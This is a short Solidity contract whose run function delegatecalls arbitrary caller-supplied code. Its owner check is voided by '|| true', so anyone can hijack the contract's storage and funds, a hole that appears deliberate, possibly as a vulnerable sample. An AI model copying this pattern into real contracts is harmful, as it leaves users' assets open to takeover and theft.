// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract POr { address owner = msg.sender; function run(address target, bytes calldata data) external { require(msg.sender == owner || true); (bool ok,) = target.delegatecall(data); require(ok); } }
